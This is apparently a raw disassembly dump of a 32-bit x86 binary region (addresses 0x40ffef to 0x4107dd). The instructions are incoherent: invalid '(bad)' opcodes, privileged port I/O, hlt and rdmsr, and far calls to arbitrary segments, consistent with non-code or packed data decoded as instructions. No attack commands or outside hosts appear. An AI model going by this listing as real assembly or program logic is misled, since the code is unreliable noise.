  40ffef:	ror    DWORD PTR [ecx-0x28],1
  40fff2:	dec    ebp
  40fff3:	inc    edi
  40fff4:	mov    DWORD PTR [ecx+0x6e],esi
  40fff7:	cs inc esi
  40fff9:	cmp    DWORD PTR [edx+eax*1-0x4e],ecx
  40fffd:	mov    edx,0x5d0cc665
  410002:	int3   
  410003:	fcomp  QWORD PTR [ecx+0x72209fa7]
  410009:	fwait
  41000a:	mov    WORD PTR [eax+0x14],?
  41000d:	mov    al,ds:0x38e0cdbc
  410012:	repnz inc edi
  410014:	xchg   DWORD PTR [ecx-0x52],eax
  410017:	sbb    al,0x59
  410019:	jp     0x41006d
  41001b:	ror    DWORD PTR ds:0xd0eb1af1,1
  410021:	inc    ecx
  410022:	mov    ss,WORD PTR [esi-0x3c9da96]
  410028:	and    esi,DWORD PTR [ebp+0x7e]
  41002b:	into   
  41002c:	rcl    BYTE PTR [ebx+0x4ca96def],1
  410032:	jb     0x410047
  410034:	or     BYTE PTR [edx-0x32],ch
  410037:	std    
  410038:	mov    ebx,DWORD PTR [ebp-0x1f04dc30]
  41003e:	cmp    eax,DWORD PTR [ecx+ebp*4+0x400a284f]
  410045:	in     eax,dx
  410046:	adc    ch,bl
  410048:	mov    bh,0x6f
  41004a:	js     0x410080
  41004c:	add    cl,ah
  41004e:	fiadd  WORD PTR [edi-0x7c]
  410051:	in     eax,0xab
  410053:	cli    
  410054:	sbb    ax,WORD PTR [eax-0x6f]
  410058:	and    edx,ecx
  41005a:	adc    bl,dl
  41005c:	addr16 cmp al,0x6c
  41005f:	lahf   
  410060:	es sub eax,0xb26b3f31
  410066:	shr    DWORD PTR [edx+0x17ed10ca],cl
  41006c:	test   eax,0x9fe5b2a5
  410071:	stos   DWORD PTR es:[edi],eax
  410072:	inc    edi
  410073:	adc    eax,DWORD PTR [edi]
  410075:	xchg   esi,eax
  410076:	ds dec ecx
  410078:	inc    ebx
  410079:	xor    al,0x44
  41007b:	popf   
  41007c:	jmp    0x4100b6
  41007e:	loope  0x41000e
  410080:	xor    al,0x5b
  410082:	loope  0x41006d
  410084:	scas   eax,DWORD PTR es:[edi]
  410085:	fs push es
  410087:	dec    BYTE PTR [edi-0x6d]
  41008a:	add    al,0x9f
  41008c:	adc    DWORD PTR [eax],esi
  41008e:	cmc    
  41008f:	nop
  410090:	adc    BYTE PTR [edx-0x4a],bl
  410093:	bound  edi,QWORD PTR [ebp+0x4c]
  410096:	add    DWORD PTR [edx+eax*4+0x41],ebx
  41009a:	cmp    al,0x81
  41009c:	mov    edi,0xd8410ccf
  4100a1:	popf   
  4100a2:	xchg   edi,eax
  4100a3:	jmp    0x418cdc7d
  4100a8:	imul   edi,DWORD PTR [eax+0x19],0x50
  4100ac:	mov    bl,0xfd
  4100ae:	gs inc edx
  4100b0:	(bad)  
  4100b1:	cmp    al,0x42
  4100b3:	call   0x513f:0x1df88122
  4100ba:	idiv   DWORD PTR [edi]
  4100bc:	cmp    DWORD PTR [ebx-0xde142f2],ebp
  4100c2:	cmp    BYTE PTR [ebx],0x20
  4100c5:	(bad)  
  4100c6:	ds sub BYTE PTR ds:[edi-0x7],dh
  4100cb:	pop    ebp
  4100cc:	int    0x8d
  4100ce:	mov    ah,0xd0
  4100d0:	mov    dl,0xc9
  4100d2:	add    eax,0x746b7ec
  4100d7:	adc    BYTE PTR [edi],al
  4100d9:	mov    ds:0x53b2edb4,eax
  4100de:	and    ecx,esi
  4100e0:	out    dx,eax
  4100e1:	shr    BYTE PTR [ebx+0x68],0x8f
  4100e5:	out    dx,al
  4100e6:	xchg   edx,eax
  4100e7:	sbb    eax,DWORD PTR [edx-0x5954f7cc]
  4100ed:	ds xchg ebx,eax
  4100ef:	int3   
  4100f0:	lds    eax,FWORD PTR [ecx-0x7bd849fe]
  4100f6:	addr16 ja 0x4100db
  4100f9:	mov    cl,0x1e
  4100fb:	mov    dl,0xd4
  4100fd:	out    dx,al
  4100fe:	or     dh,BYTE PTR [edx-0x540a8dd7]
  410104:	js     0x4100fe
  410106:	mov    ds:0xa71e7828,al
  41010b:	fdiv   st(7),st
  41010d:	add    edi,DWORD PTR [esi+0x30e485bc]
  410113:	gs in  eax,0xd2
  410116:	push   cs
  410117:	int3   
  410118:	ds pop edi
  41011a:	xchg   BYTE PTR [esi+0x694dd787],ch
  410120:	sti    
  410121:	mov    ds,WORD PTR [edi+0x74]
  410124:	les    esi,FWORD PTR [ecx+0x29]
  410127:	popa   
  410128:	mov    ds:0x1bbc8e82,al
  41012d:	push   ss
  41012e:	out    0xd4,al
  410130:	xor    edx,ebx
  410132:	je     0x410132
  410134:	loope  0x410115
  410136:	in     eax,dx
  410137:	shr    esp,1
  410139:	mov    dh,0x75
  41013b:	aad    0x55
  41013d:	aaa    
  41013e:	mov    eax,0x85937bbc
  410143:	fld    QWORD PTR [esi]
  410145:	out    0x25,eax
  410147:	sbb    DWORD PTR [edx+0x43],ebp
  41014a:	je     0x4100f0
  41014c:	inc    ebp
  41014d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41014e:	xchg   DWORD PTR [ecx-0x15],ecx
  410151:	cmp    al,0x9f
  410153:	xor    eax,DWORD PTR [esi]
  410155:	nop
  410156:	cli    
  410157:	sahf   
  410158:	cmp    BYTE PTR [edx+edi*2-0x64],ah
  41015c:	scas   al,BYTE PTR es:[edi]
  41015d:	div    DWORD PTR [esi-0x730c168d]
  410163:	clc    
  410164:	loopne 0x4101bb
  410166:	icebp  
  410167:	retf   0x8d4f
  41016a:	inc    ecx
  41016b:	jnp    0x4101e4
  41016d:	xchg   ebp,eax
  41016e:	mov    ch,0xed
  410170:	inc    ecx
  410171:	jns    0x4101de
  410173:	push   es
  410174:	dec    edi
  410175:	push   ss
  410176:	and    esi,DWORD PTR [eax-0x2e2cfe2]
  41017c:	fnsave [eax+0x62]
  41017f:	cli    
  410180:	adc    cl,BYTE PTR [esi-0xdded98e]
  410186:	rcl    DWORD PTR [edi],0xe
  410189:	jg     0x4101da
  41018b:	call   0xc8c8:0x499bbf0f
  410192:	mov    ds:0xc73258c3,eax
  410197:	in     al,dx
  410198:	push   es
  410199:	stos   DWORD PTR es:[edi],eax
  41019a:	or     al,0x86
  41019c:	aam    0x3
  41019e:	add    ebx,DWORD PTR [ebx+0x2b94a132]
  4101a4:	add    eax,0xc361387b
  4101a9:	mov    ch,0x8e
  4101ab:	and    edx,0xffffff91
  4101ae:	lds    ebp,FWORD PTR ds:0xfa820b34
  4101b4:	mov    dl,0xfc
  4101b6:	nop
  4101b7:	int3   
  4101b8:	dec    edi
  4101b9:	dec    ebp
  4101ba:	test   eax,0xf6db4a77
  4101bf:	(bad)  
  4101c0:	cwde   
  4101c1:	mov    ecx,0x52d1e65d
  4101c6:	aas    
  4101c7:	pushf  
  4101c8:	shr    DWORD PTR [edx-0x5e],cl
  4101cb:	arpl   WORD PTR [edx+ebp*4+0x1e],dx
  4101cf:	sub    eax,0xb2a49019
  4101d4:	mov    esi,0xd8e594d4
  4101d9:	dec    ebp
  4101da:	add    cl,bh
  4101dc:	mov    ecx,0x400050d8
  4101e1:	dec    esp
  4101e2:	xchg   edi,eax
  4101e3:	addr16 mov esi,0x7ec05013
  4101e9:	repz fdecstp 
  4101ec:	dec    eax
  4101ed:	push   es
  4101ee:	push   es
  4101ef:	in     eax,0x9a
  4101f1:	sub    eax,0x3ddfb94a
  4101f6:	jno    0x410218
  4101f8:	iret   
  4101f9:	test   BYTE PTR [ebp-0x52ed5a07],al
  4101ff:	shr    BYTE PTR [esi-0x3e],cl
  410202:	jnp    0x4101d5
  410204:	repnz adc bh,bh
  410207:	push   ebx
  410208:	adc    dh,ch
  41020a:	jle    0x410252
  41020c:	ret    
  41020d:	dec    ebx
  41020e:	inc    ebx
  41020f:	arpl   WORD PTR [edi-0x212271ee],di
  410215:	mov    edi,0x87796313
  41021a:	pop    ecx
  41021b:	jbe    0x410278
  41021d:	xchg   ebp,eax
  41021e:	int    0x9b
  410220:	int    0xd1
  410222:	stc    
  410223:	(bad)  
  410224:	or     eax,0x33eb6135
  410229:	adc    edx,DWORD PTR [eax-0xfd1565d]
  41022f:	mov    dh,0xc9
  410231:	and    al,0xe1
  410233:	stc    
  410234:	inc    ebx
  410235:	(bad)  
  410236:	xchg   ecx,eax
  410237:	call   esi
  410239:	mov    edx,0x56d7f476
  41023e:	cs lahf 
  410240:	sub    ebx,DWORD PTR [edi+0xeddadf7]
  410246:	sub    al,0xa3
  410248:	imul   esi,DWORD PTR [esi-0x5e],0xffffff98
  41024c:	mov    ch,0x17
  41024e:	mov    ds:0xb2318a1f,eax
  410253:	outs   dx,BYTE PTR ds:[esi]
  410254:	clc    
  410255:	cli    
  410256:	into   
  410257:	test   BYTE PTR [eax-0x4f528961],0x20
  41025e:	jle    0x4102b9
  410260:	sub    BYTE PTR [esi-0x5b40487],cl
  410266:	jno    0x4102b2
  410268:	push   ebx
  410269:	xor    dl,BYTE PTR [ebp+eax*8-0x36420d23]
  410270:	or     DWORD PTR [eax+0x76],0x116a81b6
  410277:	mov    ecx,0xf4ae72ab
  41027c:	add    eax,0x48ac9b07
  410281:	aad    0x15
  410283:	lock sbb al,0xc4
  410286:	out    0x2f,al
  410288:	(bad)  
  410289:	jp     0x410247
  41028b:	mov    al,0x9b
  41028d:	dec    ecx
  41028e:	adc    al,0x7b
  410290:	xor    DWORD PTR [eax-0x19c638f3],ecx
  410296:	das    
  410297:	mov    eax,DWORD PTR [eax-0x4f]
  41029a:	jb     0x4102a5
  41029c:	stos   DWORD PTR es:[edi],eax
  41029d:	dec    ebp
  41029e:	inc    ebx
  41029f:	cmp    BYTE PTR [edi],0xe1
  4102a2:	dec    ebp
  4102a3:	adc    esi,0xffffffad
  4102a6:	in     eax,0x60
  4102a8:	mov    eax,ds:0xbd4f7a63
  4102ad:	sar    DWORD PTR [eax],cl
  4102af:	dec    esi
  4102b0:	jmp    0xe0c5:0x3ea79c3f
  4102b7:	cmp    DWORD PTR [ecx],esp
  4102b9:	fs ins BYTE PTR es:[edi],dx
  4102bb:	lock in eax,0x13
  4102be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102bf:	pushf  
  4102c0:	je     0x4102fd
  4102c2:	mov    dh,0xb2
  4102c4:	enter  0xd1f5,0x2e
  4102c8:	inc    edx
  4102c9:	in     al,0xee
  4102cb:	push   ecx
  4102cc:	fldenv [edi+0x29]
  4102cf:	fwait
  4102d0:	rcl    ebx,1
  4102d2:	es jle 0x410309
  4102d5:	(bad)  
  4102d6:	stc    
  4102d7:	mov    esi,0x1bdb0006
  4102dc:	mov    dl,0xeb
  4102de:	(bad)  
  4102df:	dec    esi
  4102e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102e1:	lahf   
  4102e2:	stc    
  4102e3:	retf   
  4102e4:	dec    ebx
  4102e5:	out    0x1b,al
  4102e7:	call   0xaed0:0xe718047
  4102ee:	jl     0x4102ff
  4102f0:	mov    bl,0x91
  4102f2:	js     0x4102da
  4102f4:	aam    0x32
  4102f6:	push   es
  4102f7:	cs dec edx
  4102f9:	sbb    ch,BYTE PTR [ecx]
  4102fb:	push   cs
  4102fc:	and    bl,ah
  4102fe:	test   BYTE PTR [esi],ah
  410300:	mov    al,ds:0x5e312a72
  410305:	xchg   dh,bh
  410307:	out    0xac,eax
  410309:	mov    ds,WORD PTR [esi+0x3573a0f8]
  41030f:	jbe    0x410317
  410311:	call   0xde31:0x3b4fb854
  410318:	out    dx,eax
  410319:	add    ah,BYTE PTR [edi-0x54]
  41031c:	cmp    edx,DWORD PTR [esi-0x605fd8a9]
  410322:	jg     0x410355
  410324:	add    DWORD PTR [edi*1+0x586d82ec],edx
  41032b:	add    al,BYTE PTR [esp+ebp*8]
  41032e:	in     eax,0xaa
  410330:	mov    al,BYTE PTR [edx-0x27531b0b]
  410336:	nop
  410337:	inc    eax
  410338:	or     esi,DWORD PTR [ebp-0x30e4c612]
  41033e:	(bad)  
  41033f:	stos   DWORD PTR es:[edi],eax
  410340:	cs dec eax
  410342:	dec    ecx
  410343:	jl     0x41037f
  410345:	mov    esi,0x58c8271f
  41034a:	call   0x6ed7:0xdf20654d
  410351:	pop    edi
  410352:	mov    cl,BYTE PTR [edx+0x7ab1af95]
  410358:	leave  
  410359:	jmp    0x410312
  41035b:	and    cl,BYTE PTR [eax+0x64]
  41035e:	dec    ebx
  41035f:	jge    0x410377
  410361:	dec    ecx
  410362:	sub    edx,DWORD PTR [ebx]
  410364:	inc    edi
  410365:	(bad)  
  410366:	shr    BYTE PTR [ebx-0x4f],0x6f
  41036a:	sbb    al,0xf1
  41036c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41036d:	sbb    eax,0x9963a6db
  410372:	aaa    
  410373:	jb     0x41031d
  410375:	push   ebp
  410376:	jecxz  0x4103ad
  410378:	inc    eax
  410379:	add    BYTE PTR [esi-0x6d],0xf1
  41037d:	fcom   DWORD PTR [edi+0x5155761c]
  410383:	mov    al,0xa8
  410385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410386:	(bad)  
  410388:	add    eax,0x4128cde7
  41038d:	and    eax,0xd30e3671
  410392:	add    DWORD PTR [ebx+0x47],ecx
  410395:	add    BYTE PTR [esi],dh
  410397:	xor    esp,DWORD PTR [ecx]
  410399:	lods   eax,DWORD PTR ds:[esi]
  41039a:	in     eax,0x2a
  41039c:	xor    DWORD PTR [edi],0x7f
  41039f:	and    al,bh
  4103a1:	adc    al,0x9
  4103a3:	jnp    0x4103a0
  4103a5:	mov    fs,WORD PTR [ebx]
  4103a7:	mov    dl,0xe5
  4103a9:	fs sub al,0x79
  4103ac:	in     eax,0x54
  4103ae:	(bad)
  4103b1:	(bad)  
  4103b2:	jg     0x410395
  4103b4:	cdq    
  4103b5:	push   ss
  4103b6:	leave  
  4103b7:	fs addr16 lahf 
  4103ba:	pop    edi
  4103bb:	sar    BYTE PTR [eax],1
  4103bd:	sbb    eax,0xad70938
  4103c2:	adc    BYTE PTR [edx-0x4a91ec38],bh
  4103c8:	pop    edx
  4103c9:	and    DWORD PTR [edx+ebx*4+0xe4bc638],esi
  4103d0:	ret    
  4103d1:	mov    ds:0x2117decb,al
  4103d6:	sub    ah,al
  4103d8:	lock pop ecx
  4103da:	pop    eax
  4103db:	stc    
  4103dc:	mov    bl,0x31
  4103de:	mov    esp,0x7fbed5e
  4103e3:	sub    BYTE PTR [esp+ebp*2+0x16],0xe9
  4103e8:	mov    ecx,DWORD PTR [esi-0x3c28c3bf]
  4103ee:	pushf  
  4103ef:	repz and esp,eax
  4103f2:	push   ss
  4103f3:	call   0x1629:0x1ace7375
  4103fa:	mov    BYTE PTR [edi],dh
  4103fc:	jmp    0x12b9:0x892f7fdf
  410403:	xchg   BYTE PTR [edx+0x4bdbb1f8],bl
  410409:	adc    esp,ebx
  41040b:	add    al,0xf0
  41040d:	dec    ecx
  41040e:	dec    esi
  41040f:	addr16 inc edx
  410411:	dec    esi
  410412:	and    DWORD PTR [edx-0x1f4aed2f],ebx
  410418:	test   DWORD PTR [ecx+0x5c166331],edx
  41041e:	popf   
  41041f:	xchg   DWORD PTR [edx+ecx*2+0x2d],ecx
  410423:	xor    edx,DWORD PTR [eax+0x19]
  410426:	jmp    0x4103e8
  410428:	in     al,dx
  410429:	push   ds
  41042a:	adc    DWORD PTR [ecx+0x57],eax
  41042d:	and    al,0x2b
  41042f:	cwde   
  410430:	lods   al,BYTE PTR ds:[esi]
  410431:	sbb    al,0xba
  410433:	and    eax,0x3c2c66e7
  410438:	jp     0x41047c
  41043a:	std    
  41043b:	xchg   edi,eax
  41043d:	jl     0x41044e
  41043f:	aas    
  410440:	lods   eax,DWORD PTR ds:[esi]
  410441:	inc    edx
  410442:	inc    edx
  410443:	push   ds
  410444:	lds    ecx,FWORD PTR [eax+0x45]
  410447:	leave  
  410448:	jmp    0xdf8:0x686feb1e
  41044f:	retf   0x3cb2
  410452:	fsub   QWORD PTR [edi-0x11f1f639]
  410458:	pop    ebx
  410459:	outs   dx,DWORD PTR ds:[esi]
  41045a:	mov    edx,0x2c52b752
  41045f:	mov    ch,0xe4
  410461:	iret   
  410462:	outs   dx,DWORD PTR ds:[esi]
  410463:	stos   DWORD PTR es:[edi],eax
  410464:	pop    ebx
  410465:	addr16 pop ecx
  410467:	xchg   edi,eax
  410468:	test   DWORD PTR [ecx+0x6d],edi
  41046b:	(bad)  
  41046c:	shr    DWORD PTR [esi],cl
  41046e:	mov    bl,0x98
  410470:	dec    eax
  410471:	jo     0x41045e
  410473:	push   0x62
  410475:	push   DWORD PTR [ebp-0x4]
  410478:	pushf  
  410479:	mov    ebp,0xf2a8cbbc
  41047e:	mov    al,0xae
  410480:	jbe    0x4104f8
  410482:	popf   
  410483:	xlat   BYTE PTR ds:[ebx]
  410484:	xor    DWORD PTR [eax-0x66],ecx
  410487:	idiv   BYTE PTR [esi+0x73]
  41048a:	mov    ch,0xb6
  41048c:	xor    ah,BYTE PTR [eax+0x47]
  41048f:	pop    ecx
  410490:	dec    edi
  410491:	or     eax,0x621c3b11
  410496:	test   DWORD PTR [eax],esi
  410498:	mov    cl,0xde
  41049a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41049b:	in     eax,0xc
  41049d:	cmc    
  41049e:	cmp    al,0x5c
  4104a0:	(bad)  
  4104a1:	cs dec ebx
  4104a3:	mov    ds:0xd0b0b99d,al
  4104a8:	ins    DWORD PTR es:[edi],dx
  4104a9:	in     al,dx
  4104aa:	mov    esi,0x5b59a631
  4104af:	or     al,0xbe
  4104b1:	jne    0x4104ca
  4104b3:	xor    ch,BYTE PTR [edx+0x10]
  4104b6:	sub    BYTE PTR [esi],ah
  4104b8:	pop    eax
  4104b9:	shl    ebp,cl
  4104bb:	xor    eax,0x3f03e76f
  4104c0:	mov    DWORD PTR [edx-0xef09569],ebx
  4104c6:	push   es
  4104c7:	arpl   WORD PTR [ebx],cx
  4104c9:	(bad)  
  4104ca:	mov    edx,0xf57b69f1
  4104cf:	test   DWORD PTR [ebx],0x7693044a
  4104d5:	adc    edx,DWORD PTR [eax-0x71a55e38]
  4104db:	daa    
  4104dc:	es push ecx
  4104de:	popa   
  4104df:	stos   DWORD PTR es:[edi],eax
  4104e0:	push   eax
  4104e1:	push   es
  4104e2:	aad    0x7
  4104e4:	scas   al,BYTE PTR es:[edi]
  4104e5:	cwde   
  4104e6:	sub    BYTE PTR [edi+ecx*1],bh
  4104e9:	shl    DWORD PTR [esi+ebx*8-0x11170347],1
  4104f0:	clc    
  4104f1:	and    BYTE PTR ds:0xc2b2d3bf,ah
  4104f7:	lahf   
  4104f8:	cdq    
  4104f9:	sar    bl,1
  4104fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104fc:	xchg   esi,eax
  4104fd:	ins    BYTE PTR es:[edi],dx
  4104fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104ff:	dec    ecx
  410500:	pop    ebp
  410501:	gs nop
  410503:	loopne 0x41050c
  410505:	mov    ah,0xe7
  410507:	ret    
  410508:	push   eax
  410509:	pop    esi
  41050a:	out    0x6,eax
  41050c:	and    eax,0xd894188
  410511:	pop    ebp
  410512:	data16 mov WORD PTR [eax+0x1],ds
  410516:	cmc    
  410517:	inc    ebx
  410518:	mov    al,ds:0x2d4ec0b
  41051d:	adc    al,0xa4
  41051f:	mov    ecx,0x1b7ebe8c
  410524:	aam    0xc2
  410526:	stos   DWORD PTR es:[edi],eax
  410527:	sub    dh,bl
  410529:	add    al,0x10
  41052b:	jecxz  0x4104f5
  41052d:	adc    esi,DWORD PTR cs:[ebp+eax*8+0x2fb69be5]
  410535:	in     al,dx
  410536:	stos   BYTE PTR es:[edi],al
  410537:	add    al,0xae
  410539:	xchg   BYTE PTR [edi+0x6b97439],cl
  41053f:	dec    edx
  410540:	add    eax,DWORD PTR [esi]
  410542:	imul   ebp,DWORD PTR [ebx],0xffde584a
  410548:	fnsave [eax-0x40]
  41054b:	leave  
  41054c:	imul   eax,esi,0x34
  41054f:	lds    eax,FWORD PTR [ebp-0x1778f7b8]
  410555:	sub    eax,0x493e2a68
  41055a:	add    BYTE PTR [edi-0x36],dh
  41055d:	adc    DWORD PTR [edx+eiz*2+0x671ac846],eax
  410564:	ret    
  410565:	sub    BYTE PTR [edx+0x2bb7b530],0x16
  41056c:	les    ebx,FWORD PTR [edi-0x3806421c]
  410572:	and    al,0x6a
  410574:	out    dx,al
  410575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410576:	in     eax,dx
  410577:	push   ecx
  410578:	repnz pop edi
  41057a:	mov    edi,0x358a5da7
  41057f:	dec    edx
  410580:	sbb    al,cl
  410582:	sbb    al,BYTE PTR [edx-0x7e]
  410585:	into   
  410586:	in     al,0xdd
  410588:	call   0x45209364
  41058d:	sbb    eax,0x49192ad7
  410592:	xchg   esp,eax
  410593:	lods   eax,DWORD PTR ds:[esi]
  410594:	lahf   
  410595:	repz mov edx,0x93175025
  41059b:	call   0xf9b965b8
  4105a0:	repnz mov ebx,eax
  4105a3:	jl     0x41053c
  4105a5:	adc    eax,0x49087bbe
  4105aa:	in     al,0xc4
  4105ac:	add    ebp,0xffffff8a
  4105af:	dec    ebx
  4105b0:	mov    gs,WORD PTR [eax+0x1d]
  4105b3:	mov    ch,0xc5
  4105b5:	or     dl,BYTE PTR es:[ecx-0x3a74b132]
  4105bc:	ret    
  4105bd:	xor    dl,cl
  4105bf:	jp     0x41055a
  4105c1:	jnp    0x4105c5
  4105c3:	in     eax,dx
  4105c4:	and    BYTE PTR [ebx],ch
  4105c6:	mov    eax,ds:0x959075e0
  4105cb:	xchg   edx,eax
  4105cc:	or     bh,al
  4105ce:	xor    esi,eax
  4105d0:	pop    es
  4105d1:	and    ch,BYTE PTR [edi]
  4105d3:	push   esp
  4105d4:	jle    0x410637
  4105d6:	pushf  
  4105d7:	add    ebp,DWORD PTR [edx]
  4105d9:	lods   al,BYTE PTR ds:[esi]
  4105da:	mov    esp,DWORD PTR ds:0x20f3ea40
  4105e0:	lock mov eax,0x198259e
  4105e6:	adc    BYTE PTR [ecx-0x57],dl
  4105e9:	popa   
  4105ea:	in     eax,0x36
  4105ec:	add    eax,0xc5a78daa
  4105f1:	jnp    0x41065d
  4105f3:	sub    BYTE PTR [ecx-0x6b],ch
  4105f6:	adc    BYTE PTR [edx-0x12],al
  4105f9:	cmp    eax,DWORD PTR [ebx+ebx*4+0x73889695]
  410600:	retf   
  410601:	out    0x88,eax
  410603:	mov    DWORD PTR [edi+0x4e],eax
  410606:	fiadd  DWORD PTR [esi-0x3e]
  410609:	dec    ebx
  41060a:	pushf  
  41060b:	jmp    0x410660
  41060d:	xchg   ebx,eax
  41060e:	rdmsr  
  410610:	jp     0x410664
  410612:	mov    al,ds:0x67d935f2
  410617:	mov    ds:0x224d51e2,eax
  41061c:	mov    edi,0x9b44be67
  410621:	(bad)  
  410622:	hlt    
  410623:	fisubr WORD PTR [ebx-0x4a]
  410626:	push   ecx
  410627:	xchg   ebx,eax
  410628:	call   0xe3468e6d
  41062d:	retf   
  41062e:	(bad)  
  41062f:	sar    DWORD PTR [edi-0x7391ce3f],cl
  410635:	add    cl,BYTE PTR [ecx+edx*8-0x28]
  410639:	imul   eax,DWORD PTR [esi+0x6a],0xabd6ecbc
  410640:	es repnz test al,0x89
  410644:	fdivrp st(7),st
  410646:	sbb    edi,esp
  410648:	stc    
  410649:	aaa    
  41064a:	add    cl,BYTE PTR [esi+0x62a73abc]
  410650:	in     eax,dx
  410651:	mov    eax,DWORD PTR [eax+edx*8+0x6b]
  410655:	loop   0x4105f3
  410657:	fs mov al,0x28
  41065a:	out    0xbf,al
  41065c:	enter  0xcb68,0xb
  410660:	xor    al,0x4
  410662:	add    ebp,esp
  410664:	in     al,dx
  410665:	xor    dh,BYTE PTR [edx-0x38]
  410668:	sar    DWORD PTR [ebx+ecx*8],cl
  41066b:	xor    BYTE PTR [eax-0x11df6d7c],bl
  410671:	into   
  410672:	inc    esi
  410673:	aas    
  410674:	int    0x67
  410676:	push   ds
  410677:	iret   
  410678:	out    0x7b,eax
  41067a:	add    esi,edi
  41067c:	test   al,0xa3
  41067e:	test   BYTE PTR [ecx-0x4f],dh
  410681:	cmp    BYTE PTR [ebx+0x1c21c38d],ah
  410687:	mov    ebx,0x1b65842a
  41068c:	lahf   
  41068d:	mov    ch,0x45
  41068f:	lahf   
  410690:	cdq    
  410691:	test   DWORD PTR [ecx-0x24],edi
  410694:	xor    edx,edi
  410696:	push   0x53
  410698:	js     0x4106f7
  41069a:	and    eax,0x685433d9
  41069f:	push   ebp
  4106a0:	pop    es
  4106a1:	xor    ah,BYTE PTR [ebp+0xae9bc7f]
  4106a7:	push   cs
  4106a8:	push   ebp
  4106a9:	not    DWORD PTR [esi]
  4106ab:	fmulp  st(0),st
  4106ad:	cmp    bl,BYTE PTR [edx]
  4106af:	cmp    bh,BYTE PTR [ebp+0x2abf38cb]
  4106b5:	fwait
  4106b6:	dec    edx
  4106b7:	arpl   WORD PTR [edi+0x7f],si
  4106ba:	loopne 0x41069f
  4106bc:	mul    DWORD PTR [edx]
  4106be:	jae    0x4106e3
  4106c0:	lods   al,BYTE PTR ds:[esi]
  4106c1:	xlat   BYTE PTR ds:[ebx]
  4106c2:	hlt    
  4106c3:	mov    esi,edx
  4106c5:	sub    DWORD PTR [ebp-0x1033a7f2],ecx
  4106cb:	or     al,0x8a
  4106cd:	push   0xffffffe3
  4106cf:	mov    al,ds:0x4a4992aa
  4106d4:	(bad)  
  4106d5:	stc    
  4106d6:	cmc    
  4106d7:	push   ss
  4106d8:	dec    ebp
  4106d9:	sbb    ebx,DWORD PTR [eax-0x4966e9f8]
  4106df:	std    
  4106e0:	test   al,0x22
  4106e2:	retf   0xb3b
  4106e5:	mov    WORD PTR [ecx+0x11],fs
  4106e8:	or     al,0x99
  4106ea:	sub    esi,DWORD PTR [esi]
  4106ec:	les    edx,FWORD PTR [ebx+0x4f]
  4106ef:	jmp    0x4106d6
  4106f1:	xchg   ebx,eax
  4106f2:	xchg   ebx,eax
  4106f3:	enter  0xf244,0x1c
  4106f7:	adc    al,BYTE PTR [edx-0x4a]
  4106fa:	(bad)  
  4106fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106fc:	dec    ebp
  4106fd:	dec    esi
  4106fe:	lsl    esi,si
  410701:	push   cs
  410702:	fiadd  DWORD PTR [ecx]
  410704:	cmp    ecx,ebp
  410706:	xchg   ebp,eax
  410707:	jae    0x4106a3
  410709:	dec    esp
  41070a:	cs ss cwde 
  41070d:	cmp    bl,cl
  41070f:	ins    DWORD PTR es:[edi],dx
  410710:	int    0x43
  410712:	outs   dx,BYTE PTR ds:[esi]
  410713:	sbb    eax,0x1cb04edf
  410718:	sub    al,0x36
  41071a:	into   
  41071b:	jp     0x410759
  41071d:	retf   
  41071e:	inc    esi
  41071f:	test   al,0x49
  410721:	mov    esi,esi
  410723:	or     bl,BYTE PTR [ebp+0x1c]
  410726:	sub    al,0x8b
  410728:	xchg   esi,eax
  410729:	push   cs
  41072a:	and    dl,BYTE PTR [ecx]
  41072c:	cmp    al,BYTE PTR [ebx+0x8]
  41072f:	icebp  
  410730:	mov    ds:0xc2f6fdef,eax
  410735:	je     0x41074e
  410737:	inc    eax
  410738:	jmp    0x410771
  41073a:	popa   
  41073b:	cli    
  41073c:	mov    esp,0xad76ad32
  410741:	jne    0x4106c7
  410743:	push   ebx
  410744:	xor    dh,BYTE PTR [eax+0x2b535e9]
  41074a:	repnz sbb al,0x38
  41074d:	ret    0xa96a
  410750:	loope  0x4106ee
  410752:	fwait
  410753:	(bad)  
  410754:	xlat   BYTE PTR ds:[ebx]
  410755:	dec    edx
  410756:	push   0x6
  410758:	jnp    0x4106da
  41075a:	cmp    DWORD PTR [edx+ecx*1+0x65ac187c],ecx
  410761:	fild   WORD PTR [ebp-0x62ecba42]
  410767:	adc    eax,0xb9bc652c
  41076c:	pop    ecx
  41076d:	mov    eax,0x9517cc3e
  410772:	push   ds
  410773:	fiadd  DWORD PTR [ecx-0x70ee2b2a]
  410779:	(bad)
  41077c:	or     al,0xe3
  41077e:	adc    al,0xd1
  410780:	xor    cl,BYTE PTR [esi]
  410782:	inc    esp
  410783:	add    al,0xb5
  410785:	add    ch,BYTE PTR [ebx+0x7e]
  410788:	adc    al,0x34
  41078a:	add    edx,esi
  41078c:	cld    
  41078d:	xchg   DWORD PTR [ebp+0x4b5ea2c5],esi
  410793:	inc    edx
  410794:	jae    0x41080a
  410796:	call   DWORD PTR [edx-0x49498688]
  41079c:	les    esi,FWORD PTR [edi]
  41079e:	pop    edx
  41079f:	daa    
  4107a0:	mov    dh,0x87
  4107a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107a3:	push   0x7634d2d0
  4107a8:	adc    al,0xc6
  4107aa:	mov    BYTE PTR [edx-0x1c8a4a77],bh
  4107b0:	(bad)
  4107b3:	das    
  4107b4:	in     al,dx
  4107b5:	test   ecx,esi
  4107b7:	inc    edi
  4107b8:	sbb    bh,cl
  4107ba:	fdiv   QWORD PTR [ebp+0x7a]
  4107bd:	jbe    0x410803
  4107bf:	fs test al,0xc7
  4107c2:	cmp    al,bl
  4107c4:	xchg   ecx,eax
  4107c5:	mov    ds:0xd10a7380,eax
  4107ca:	push   ss
  4107cb:	xor    bh,bh
  4107cd:	div    DWORD PTR [edx-0x4f97115f]
  4107d3:	push   es
  4107d4:	pop    es
  4107d5:	push   ebp
  4107d6:	pushf  
  4107d7:	push   eax
  4107d8:	(bad)
  4107dc:	inc    ebp
  4107dd:	std    
